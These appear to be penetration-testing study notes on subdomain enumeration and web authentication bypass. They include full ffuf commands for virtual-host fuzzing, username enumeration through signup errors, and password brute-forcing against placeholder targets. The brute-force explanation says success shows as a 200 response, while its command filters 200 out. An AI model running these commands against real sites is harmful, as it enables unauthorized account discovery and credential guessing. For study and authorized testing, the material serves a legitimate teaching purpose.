# Notes

## Subdomain Enumeration <a href="#title" id="title"></a>

Subdomain enumeration is the process of finding valid subdomains for a domain. The three basic methods of doing this are:

#### <mark style="color:red;">**Brute Force**</mark>

Bruteforce DNS (Domain Name System) enumeration is the method of trying tens, hundreds, thousands or even millions of different possible subdomains from a pre-defined list of commonly used subdomains. Because this method requires many requests, we automate it with tools to make the process quicker.&#x20;

Use tools such as DNSrecon or Sublist3r (see useful tools page)



#### <mark style="color:red;">**Open-Source Intelligence (OSINT)**</mark>

Using a certificate search site (see two listed in [useful-links.md](useful-links.md "mention")), we can discover subdomains that belong to a domain

Use a command like "-site:www.sitename.com  site:\*.sitename.com**"** to reveal subdomains for the site you name. This search would include only results that lead to the named domain but exclude any links directly to the domain such as ""www.sitename.com". Therefore only subdomains will be shown.



#### <mark style="color:red;">**Virtual Host**</mark>

Some subdomains aren't always hosted in publicly accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their /etc/hosts file (or c:\windows\system32\drivers\etc\hosts file for Windows users) which maps domain names to IP addresses.

Use a tool like ffuf (see linked tools) to discover subdomains that do not have a DNS record

{% code overflow="wrap" %}
```
/ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.domainname.com" -u http://xx.xx.xx.xx
```
{% endcode %}

{% code overflow="wrap" %}
```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.domainname.com" -u http://xx.xx.xx.xx -fs {size}
```
{% endcode %}

In the second example above, the {size} field can be replaced to **filter out** results of the target size.

## Authentication Bypass

Methods by which you can bypass or break authentication protocols.&#x20;

#### <mark style="color:red;">Username Enumeration</mark>

Website error messages are great resources for collating this information to build our list of valid usernames. If you guess a username and fill other fields with garbage, if the website returns something like "This username is already in use", you now know an account exists with that username

Use ffuff to check for existing accounts on a website that returns such an error. The output should include a list of names. If we make a list out of that, we can use it in the next command.

{% code overflow="wrap" %}
```shell-session
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://xx.xx.xx.xx/customers/signup -mr "username already exists"
```
{% endcode %}



#### <mark style="color:red;">Brute Force</mark>

This method uses large amounts of guesses to come up with username/password information. In the example below we have a list of usernames that are present on the target. Using ffuf we are able to guess the passwords of these accounts over and over again until a match works. The command is looking for the 200(OK) response from the website to indicate success.&#x20;

{% code overflow="wrap" %}
```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://xx.xx.xx.xx/somepath/to_a/login_page -fc 200
```
{% endcode %}

#### <mark style="color:red;">Logic Flaw</mark>

Sometimes authentication processes contain logic flaws. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website

Using curl and other commands to interact with the website will allow you to get unintended information from it if it is configured incorrectly.&#x20;

#### <mark style="color:red;">Cookie Tampering</mark>

Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges.
